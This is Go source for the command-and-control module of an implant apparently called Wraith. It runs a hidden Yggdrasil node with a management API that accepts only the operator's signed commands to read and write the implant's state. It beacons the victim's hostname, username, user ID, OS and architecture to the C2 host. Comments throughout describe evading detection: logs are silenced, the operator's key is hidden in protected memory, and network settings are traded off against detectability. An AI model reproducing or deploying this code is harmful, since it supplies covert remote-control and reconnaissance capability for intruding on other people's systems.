package wraith_module_comosum

import (
	"bytes"
	"context"
	"crypto/ed25519"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/user"
	"runtime"
	"sync"
	"time"

	"dev.l1qu1d.net/wraith-labs/wraith/libwraith"
	"dev.l1qu1d.net/wraith-labs/wraith_module_comosum/internal/proto"
	"dev.l1qu1d.net/wraith-labs/wraith_module_comosum/internal/radio"
	"github.com/awnumar/memguard"
	"github.com/gologme/log"
	"github.com/yggdrasil-network/yggdrasil-go/src/address"
)

const (
	MOD_NAME = "w.comosum"

	i_SHM_ERRORS = "w.errors"
)

// A comms module implementation which utilises signed CBOR messages to remotely
// access the Wraith SHM. This module is meant as a simple default which does a
// good job in most usecases.
// The underlying protocol is [TCP / WS / QUIC / ... ] > Yggdrasil > HTTP > CBOR Structs.
type ModuleComosum struct {
	// Ensures this module runs only once at a time.
	mutex sync.Mutex

	// Keeps track of when we last spoke to daddy. If it's been too long, we'll
	// send a heartbeat so he knows we're alive.
	lastSpoke time.Time

	// Keeps track of SHM fields the module is watching so we can receive updates
	// and unwatch them.
	watching map[struct {
		string
		int
	}]chan any

	// Configuration.

	// This value solely decides who has control over this module. The owner
	// of the matching private key will be able to set up a C2 yggdrasil node.
	AdminPubKey ed25519.PublicKey

	// The private key that should be used for this instance of Comosum on
	// the Yggdrasil network. This MUST NOT be hardcoded and MUST instead
	// be generated at runtime to prevent clashes. The key is an argument
	// to allow for custom generators.
	OwnPrivKey ed25519.PrivateKey

	// How long to wait after the last communication with C2 before sending
	// a heartbeat. We send a heartbeat on startup and C2 should be keeping
	// track of us so this can safely be quite a long time. Making this too
	// long means that, if C2 suffers state loss, it will likely not be able
	// to communicate with this Comosum until this timeout runs out. On the
	// other hand, setting the value too low can make us too chatty and
	// therefore detectable. 24 hours is probably a good choice.
	LonelinessTimeout time.Duration

	// Which address (if any) Comosum should listen on for raw TCP yggdrasil
	// connections. Setting this makes the Wraith more detectable but might
	// improve its chances of successfully connecting to C2.
	ListenTcp string

	// Which address (if any) Comosum should listen on for websocket yggdrasil
	// connections. Setting this makes the Wraith more detectable but might
	// improve its chances of successfully connecting to C2.
	ListenWs string

	// Whether or not Comosum should use multicast to find other Comosum
	// Wraiths on the local network. Setting this makes the Wraith more detectable
	// but might improve its chances of successfully connecting to C2.
	UseMulticast bool

	// Which yggdrasil peers (if any) Comosum should immediately connect to on
	// startup. Note that leaving this blank makes it very difficult for commands
	// to reach Comosum, and impossible if the listener and multicast options are
	// disabled. On the other hand, more peers means more network traffic
	// and higher chances of detection.
	StaticPeers []string

	// Enable some debugging features like logging and the admin endpoint. DO NOT
	// leave enabled in deployed instances.
	Debug bool
}

func (m *ModuleComosum) Mainloop(ctx context.Context, w *libwraith.Wraith) {
	//
	// Misc setup.
	//

	// Ensure this instance is only started once and mark as running if so.
	single := m.mutex.TryLock()
	if !single {
		panic(fmt.Errorf("%s already running", MOD_NAME))
	}
	defer m.mutex.Unlock()

	// Ensure the admin public key is protected in memory. We don't want to make it
	// too easy to find out who is at the wheel now, do we?
	defer memguard.Purge()

	// Make sure keys are valid.
	if keylen := len(m.OwnPrivKey); keylen != ed25519.PrivateKeySize {
		panic(fmt.Errorf("[%s] incorrect private key size (is %d, should be %d)", MOD_NAME, keylen, ed25519.PublicKeySize))
	}
	if keylen := len(m.AdminPubKey); keylen != ed25519.PublicKeySize {
		panic(fmt.Errorf("[%s] incorrect admin key size (is %d, should be %d)", MOD_NAME, keylen, ed25519.PublicKeySize))
	}
	// Who's your daddy?
	daddyIP := memguard.NewEnclave(net.IP(address.AddrForKey(m.AdminPubKey)[:]).To16())
	daddyPubKey := memguard.NewEnclave(m.AdminPubKey)
	memguard.ScrambleBytes(m.AdminPubKey)

	var err error

	// Disable Yggdrasil logging unless debug mode is enabled - we don't
	// want to give away any info.
	logger := log.New(io.Discard, "", log.Flags())
	if m.Debug {
		logger = log.New(os.Stdout, MOD_NAME, log.Flags())
	}

	//
	// Create and start an Yggdrasil node.
	//

	// Set up Yggdrasil.
	n := radio.NewNode(logger)
	n.GenerateConfig()
	if err = n.Run(); err != nil {
		logger.Fatalln(err)
	}

	addr, _ := n.Address()

	// Set up userspace network stack to handle Yggdrasil packets.
	s, err := radio.CreateYggdrasilNetstack(n)
	if err != nil {
		panic(err)
	}

	// Create a special HTTP client that can send requests over Yggdrasil.
	yggHttpClient := http.Client{
		Transport: &http.Transport{
			ForceAttemptHTTP2: true,
			DialContext:       s.DialContext,
		},
	}

	//
	// Set up and start management API.
	//

	port := rand.Intn(radio.MGMT_PORT_MAX-radio.MGMT_PORT_MIN) + radio.MGMT_PORT_MIN
	tcpListener, _ := s.ListenTCP(&net.TCPAddr{Port: port})

	mux := http.NewServeMux()
	mux.HandleFunc("/", func(res http.ResponseWriter, req *http.Request) {
		daddyIPBytes, _ := daddyIP.Open()
		daddyPubKeyBytes, _ := daddyPubKey.Open()
		defer daddyIPBytes.Destroy()
		defer daddyPubKeyBytes.Destroy()

		// Verify that the connection is coming from C2.
		if req.RemoteAddr != net.IP(daddyIPBytes.Bytes()).String() {
			// You're not my daddy!
			res.WriteHeader(http.StatusForbidden)
			return
		}

		// Get the request body.
		body, err := io.ReadAll(req.Body)
		if err != nil {
			res.WriteHeader(http.StatusBadRequest)
			return
		}

		requestData := proto.PacketExchangeReq{}
		err = proto.Unmarshal(&requestData, daddyPubKeyBytes.Bytes(), body)
		if err != nil {
			// The packet data is malformed, there is nothing more we
			// can do.
			res.WriteHeader(http.StatusBadRequest)
			return
		}

		responseData := proto.PacketExchangeRes{}

		// Set.
		if len(requestData.Set) != 0 {
			result := []string{}
			for key, value := range requestData.Set {
				w.SHMSet(key, value)
				result = append(result, key)
			}
			responseData.Set = result
		}

		// Get.
		if len(requestData.Get) != 0 {
			result := map[string]any{}
			for _, key := range requestData.Get {
				result[key] = w.SHMGet(key)
			}
			responseData.Get = result
		}

		// Watch.
		if len(requestData.Watch) != 0 {
			result := map[string]int{}
			for _, key := range requestData.Watch {
				channel, watchId := w.SHMWatch(key)

				// Keep track of this watch internally.
				m.watching[struct {
					string
					int
				}{
					key,
					watchId,
				}] = channel

				result[key] = watchId
			}
			responseData.Watch = result
		}

		// Unwatch.
		if len(requestData.Unwatch) != 0 {
			result := []struct {
				CellName string
				WatchId  int
			}{}
			for _, key := range requestData.Unwatch {
				w.SHMUnwatch(key.CellName, key.WatchId)
				result = append(result, key)

				// Delete internal record of this watch.
				delete(m.watching, struct {
					string
					int
				}{
					key.CellName,
					key.WatchId,
				})

				result = append(result, key)
			}
			responseData.Unwatch = result
		}

		// Dump.
		if requestData.Dump {
			responseData.Dump = w.SHMDump()
		}

		// Prune.
		if requestData.Prune {
			responseData.Prune = w.SHMPrune()
		}

		// Respond!
		responseDataBytes, err := proto.Marshal(&responseData, m.OwnPrivKey)
		if err != nil {
			w.SHMSet(libwraith.SHM_ERRS, fmt.Errorf("marshalling response failed: %e", err))
			return
		}

		res.Write(responseDataBytes)
		res.WriteHeader(http.StatusOK)

		// Update last spoke time so we don't send unnecessary heartbeats.
		m.lastSpoke = time.Now()
	})

	server := http.Server{
		Addr:                         ":0",
		Handler:                      mux,
		DisableGeneralOptionsHandler: true,
	}

	logger.Info(fmt.Printf("management API listening on http://[%s]:%d\n", addr.String(), port))

	var wg sync.WaitGroup
	wg.Add(2)

	go func() {
		defer wg.Done()

		server.Serve(tcpListener)
	}()

	// Heartbeat loop.
	go func() {
		defer wg.Done()

		// Cache some values used in the heartbeat.

		strain := w.GetStrainId()
		initTime := w.GetInitTime()
		hostname, err := os.Hostname()
		if err != nil {
			hostname = "<unknown>"
		}
		username := "<unknown>"
		userId := "<unknown>"
		currentUser, err := user.Current()
		if err == nil {
			username = currentUser.Username
			userId = currentUser.Uid
		}

		for {
			timeUntilHeartbeat := m.lastSpoke.Add(m.LonelinessTimeout).Sub(time.Now())

			// Send heartbeat after interval or exit if requested.
			select {
			case <-ctx.Done():
				return
			case <-time.After(timeUntilHeartbeat):
				func() {
					daddyIP, _ := daddyIP.Open()
					defer daddyIP.Destroy()

					// Build a heartbeat data packet.
					heartbeatData := proto.PacketHeartbeatReq{
						StrainId:   strain,
						InitTime:   initTime,
						Modules:    w.ModsGet(),
						HostOS:     runtime.GOOS,
						HostArch:   runtime.GOARCH,
						Hostname:   hostname,
						HostUser:   username,
						HostUserId: userId,
					}
					heartbeatBytes, err := proto.Marshal(&heartbeatData, m.OwnPrivKey)
					if err != nil {
						panic("error while marshaling heartbeat data, cannot continue: " + err.Error())
					}

					// Build a request to send the packet.
					req := http.Request{
						Method: http.MethodPost,
						URL: &url.URL{
							Scheme: "http",
							Host:   net.IP(daddyIP.Bytes()).String(),
							Path:   proto.ROUTE_PREFIX + proto.ROUTE_HEARTBEAT,
						},
						Cancel: ctx.Done(),
						Body:   io.NopCloser(bytes.NewReader(heartbeatBytes)),
					}

					// Send request to C2.
					// We explicitly don't care about the result of this request.
					// If it succeeded, great. If it failed, there's nothing we can do here.
					_, _ = yggHttpClient.Do(&req)

					// Update last spoke time so we don't spam C2 with requests.
					m.lastSpoke = time.Now()
				}()
			}
		}
	}()

	//
	// Cleanup.
	//

	// Block until we need to shut down.
	<-ctx.Done()

	server.Close()
	tcpListener.Close()
	n.Close()

	// Block until all goroutines have exited.
	wg.Wait()
}

// Return the name of this module.
func (m *ModuleComosum) WraithModuleName() string {
	return MOD_NAME
}
